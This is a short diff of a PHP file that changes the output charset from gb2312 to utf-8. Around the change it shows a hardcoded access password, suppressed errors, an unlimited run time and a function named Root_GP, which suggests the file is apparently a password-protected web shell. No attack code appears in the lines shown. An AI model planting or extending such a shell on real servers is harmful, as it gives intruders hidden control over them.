@@ -3,7 +3,7 @@
 $password = "silic";//设置密码
 
 error_reporting(E_ERROR);
-header("content-Type: text/html; charset=gb2312");
+header("content-Type: text/html; charset=utf-8");
 set_time_limit(0);
 
 function Root_GP(&$array)
